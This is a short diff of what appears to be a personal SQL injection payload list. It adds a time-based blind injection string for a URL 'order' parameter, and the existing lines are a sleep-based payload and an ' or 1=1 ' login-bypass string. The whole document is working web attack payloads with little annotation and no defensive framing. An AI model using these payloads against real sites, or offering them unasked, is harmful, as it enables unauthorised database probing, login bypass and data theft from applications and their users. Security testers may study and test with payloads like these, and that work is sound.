@@ -1,4 +1,6 @@
 
+&order=asc,(SELECT%20(CASE%20WHEN%20(1=1)%20THEN%20SLEEP(10)%20ELSE%202%20END)) //time based
+
 ‘+(select*from(select(sleep(20)))a)+’ //this is for time based sql injection 
 
 ' or 1=1 limit 1 -- -+
